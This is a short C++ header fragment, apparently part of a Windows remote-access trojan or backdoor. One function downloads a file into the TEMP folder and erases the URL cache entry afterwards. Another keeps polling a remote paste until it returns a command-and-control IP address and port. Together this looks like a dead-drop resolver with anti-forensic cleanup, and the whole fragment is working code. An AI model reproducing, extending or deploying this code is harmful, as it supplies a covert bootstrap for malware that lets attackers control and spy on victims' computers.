#pragma once

string downloadByUrl(LPCSTR url, string name) {
    string temp = getenv("TEMP");
    temp += "//" + name;
    HRESULT res = URLDownloadToFileA(NULL, url, temp.c_str(), 0, NULL);;
    DeleteUrlCacheEntryA(url);
    ZeroMemory(&url, sizeof(url));

    return temp;
}

vector<string> getSettingsFromPaste() {
    bool settingsStage = 0;
    string IP;
    string PORT;
    while (!settingsStage) {
        string fileName = downloadByUrl(URL, NAME);
        vector<string> settings = readFileLines(fileName);
        if (settings.size() != 2) {
            printf("Settings incorrect");
        }
        else {
            IP = settings[0];
            PORT = settings[1];
            printf("IP: %s, PORT: %s\n", IP.c_str(), PORT.c_str());
            settingsStage = !settingsStage;
        }
    }
    return vector<string> {IP, PORT};
}